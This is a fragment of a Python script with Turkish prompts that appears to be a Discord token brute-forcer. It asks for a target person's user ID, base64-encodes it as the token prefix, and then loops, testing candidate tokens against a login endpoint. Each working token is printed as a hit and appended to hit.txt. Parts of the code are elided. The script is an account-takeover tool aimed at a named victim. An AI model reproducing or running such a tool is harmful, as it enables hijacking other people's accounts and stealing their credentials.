...
id_to_token = base64.b64encode((input("Tokenini zorlamak istediginiz kisinin idsini girin ")).encode("ascii"))
...
while id_to_token == id_to_token:
    ...
    try:
        if login.status_code == 200:
            print(Fore.GREEN + '[+] Casiliyor' + ' ' + token)
            f = open('hit.txt', "a+")
            f.write(f'{token}\n')
        else:
            print(Fore.RED + '[-] Calismiyor' + ' ' + token)
    finally:
        print("")
